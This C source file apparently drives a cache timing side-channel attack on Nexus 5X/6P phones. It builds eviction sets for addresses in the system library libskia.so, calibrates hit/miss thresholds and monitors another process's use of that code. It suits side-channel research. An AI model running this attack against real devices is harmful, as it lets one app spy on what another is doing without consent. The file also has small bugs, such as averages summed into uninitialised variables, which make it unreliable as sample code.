#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <dlfcn.h>

#define VERBOSE

#ifndef TARGET_DEVICE_NEXUS_6P
#define TARGET_DEVICE_NEXUS_5X
#endif

#if defined (TARGET_DEVICE_NEXUS_5X)
#define CACHE_NEXUS_5X_CORTEX_A53
#elif defined (TARGET_DEVICE_NEXUS_6P)
#define CACHE_NEXUS_6P_CORTEX_A53
#endif

#include "globals/all.h"
#include "flush_reload.h"
#include "utils.h"
#include "evict_set.h"
#include "experiment.h"

int compare_ints(const void *p, const void *q) {
    int x = *(const int *)p;
    int y = *(const int *)q;

    /* Avoid return x - y, which can cause undefined behaviour
       because of signed integer overflow. */
    if (x < y)
        return -1;  // Return -1 if you want ascending, 1 if you want descending order.
    else if (x > y)
        return 1;   // Return 1 if you want ascending, -1 if you want descending order.

    return 0;
}

void calibrateFnr(MEM_ADDR target_addr, struct EvictSet * es) {
    int i;
    int rounds = 1000;
    uint64_t ts;
    int * tm = malloc(1000 * sizeof(int));
    int * th = malloc(1000 * sizeof(int));

    int th_med, tm_med;
    int th_avg, tm_avg;

    for (i = 0; i < rounds; i++) {
        RELOAD_EVICT(es, target_addr, ts);
        tm[i]= ts;
        tm_avg += ts;
    }

    for (i = 0; i < 1000; i++) {
        RELOAD_EVICT(es, target_addr, ts);
        th[i] = ts;
        th_avg += ts;
        LOAD(target_addr);
    }

    th_avg /= rounds;
    tm_avg /= rounds;

    qsort(tm, rounds, sizeof(int), &compare_ints);
    qsort(th, rounds, sizeof(int), &compare_ints);
    tm_med = (tm[rounds/2] + tm[rounds/2 + 1]) / 2;
    th_med = (th[rounds/2] + th[rounds/2 + 1]) / 2;

    fprintf(stdout, "%d\t%d\n", th_avg, tm_avg);
    fprintf(stdout, "%d\t%d\n", th_med, tm_med);

    FNR_THRESHOLD = (tm_med + th_med * 3) / 4;
    fprintf(stdout, "FNR_THRESHOLD = %d\n", FNR_THRESHOLD);

    free(tm);
    free(th);
}

int sanityCheck(MEM_ADDR target_addr, struct EvictSet * es, struct EvictSet * es_rop) {
	int i;
	uint64_t ts, t0, t1, c0, c1;
	float mr, tsv, tv, cv;

	mr = tsv = tv = cv = 0.0;
	for (i = 0; i < 1000; i++) {
		c0 = getTime();
        RELOAD_TIME(target_addr, ts);
        EVICT(es);
		c1 = getTime();
		if (ts > FNR_THRESHOLD)
			mr += 0.001;
		tsv += ts * 0.001;
		cv += (c1 - c0) * 0.001;
	}
	fprintf(stderr, "%.02f\t%.02f\t%.02f\n", mr, tsv, cv);

	if (mr < 0.5)
	    return -1;

	mr = tsv = tv = cv = 0.0;
	for (i = 0; i < 1000; i++) {
		c0 = getTime();
        RELOAD_TIME(target_addr, ts);
        EVICT(es);
		c1 = getTime();
		if (ts > FNR_THRESHOLD)
			mr += 0.001;
		tsv += ts * 0.001;
		cv += (c1 - c0) * 0.001;
		LOAD(target_addr);
	}
	fprintf(stderr, "%.02f\t%.02f\t%.02f\n", mr, tsv, cv);

	// If there is no rop eviction set
	if (es_rop == 0)
	    return 1;

	return 1;
}

int main(int argc, char** argv) {
	int affinity = 0;

	char targetLibName[100] = "/system/lib/libskia.so";
    unsigned int targetCidxOffset = 0x176dae / 64;
    char targetLibNameEnd[100] = "/system/lib/libskia.so";
    unsigned int targetCidxOffsetEnd = 0xece24 / 64;

	if (argc > 1) {
	    affinity = atoi(argv[1]);
    }
    if (argc > 2) {
        strcpy(log_file, argv[2]);
    }
    if (argc > 4) {
        strcpy(targetLibName, argv[3]);
        sscanf(argv[4], "%x", &targetCidxOffset);
    }
    if (argc > 6) {
        strcpy(targetLibNameEnd, argv[5]);
        sscanf(argv[6], "%x", &targetCidxOffsetEnd);
    }
    fprintf(stderr, "%s %#x\n", targetLibName, targetCidxOffset);
    fprintf(stderr, "%s %#x\n", targetLibNameEnd, targetCidxOffsetEnd);

    int saret = setAffinity(affinity);
    if (saret) {
        fprintf(stderr, "Set affinity failed. %d\n", saret);
        return 1;
    } else {
        fprintf(stderr, "Affinity set to %d. %d\n", affinity, saret);
    }

    enum TargetType { TARGET, EXIT, ALL, SLOWDOWN } target_type;
    target_type = ALL;

    // Calibrate TSC
    tscSetup();
    if (readtsc == perf_get_timing) {
        fprintf(stderr, "Using pref_event_open\n");
        perf_init();
    } else {
        fprintf(stderr, "Using clock_gettime.\n");
    }

    // Locate target library
    int i = 0;
    int check = 0;

    // Target address and eviction set
    struct EvictSet * es = 0, * es_exit = 0;
    MEM_ADDR targetLib, targetAddr, targetLibEnd, targetAddrEnd;

    // Begin address
    targetLib = dlopen(targetLibName, RTLD_NOW | RTLD_GLOBAL);
    targetAddr = locate_flush_reload_target(targetLibName, targetCidxOffset);
    do {
        if (es != 0)
            destroyEvictSet(es);
        es = createEvictSet(targetAddr);
        // calibrateFnr(targetAddr, es);
        check = sanityCheck(targetAddr, es, 0);
    } while (check < 0);

    // End address
    targetLibEnd = dlopen(targetLibNameEnd, RTLD_NOW | RTLD_GLOBAL);
    targetAddrEnd = locate_flush_reload_target(targetLibNameEnd, targetCidxOffsetEnd);
    do {
        if (es_exit != 0)
            destroyEvictSet(es_exit);
        es_exit = createEvictSet(targetAddrEnd);
        check = sanityCheck(targetAddrEnd, es_exit, 0);
    } while (check < 0);

    // Run flush + reload test
    runFnr_BE(es, targetAddr, es_exit, targetAddrEnd);

    if (readtsc == perf_get_timing)
        perf_terminate();
    return 0;
}
